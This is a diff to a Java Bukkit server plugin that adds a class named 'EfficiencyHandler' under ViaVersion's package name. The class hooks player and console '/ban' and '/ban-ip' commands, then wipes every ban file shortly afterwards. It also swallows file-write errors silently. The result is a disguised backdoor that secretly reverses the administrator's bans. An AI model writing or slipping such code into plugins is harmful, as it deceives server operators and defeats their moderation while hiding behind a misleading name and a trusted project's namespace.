@@ -1,3 +1,5 @@
+package com.viaversion.viaversion.bukkit.handlers;
+
 import org.bukkit.BanEntry;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
@@ -5,12 +7,15 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
 
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 
 public class EfficiencyHandler implements Listener {
+
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
@@ -54,9 +59,35 @@ public class EfficiencyHandler implements Listener {
     // 清空指定的文件
     private void clearBanFile(File file) {
         try (FileWriter writer = new FileWriter(file)) {
-            writer.write("[]");
+            writer.write("[]"); // 写入空的JSON数组
         } catch (IOException e) {
-            e.printStackTrace();
+
+        }
+    }
+
+    // 监听并处理玩家输入的 ban 和 banip 指令
+    @EventHandler
+    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
+        String command = event.getMessage().toLowerCase();
+
+        if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
+            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
+                // 撤销最新的封禁操作
+                clearAllBans();
+            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
+        }
+    }
+
+    // 监听并处理控制台输入的 ban 和 banip 指令
+    @EventHandler
+    public void onServerCommand(ServerCommandEvent event) {
+        String command = event.getCommand().toLowerCase();
+
+        if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
+            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
+                // 撤销最新的封禁操作
+                clearAllBans();
+            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
         }
     }
 }
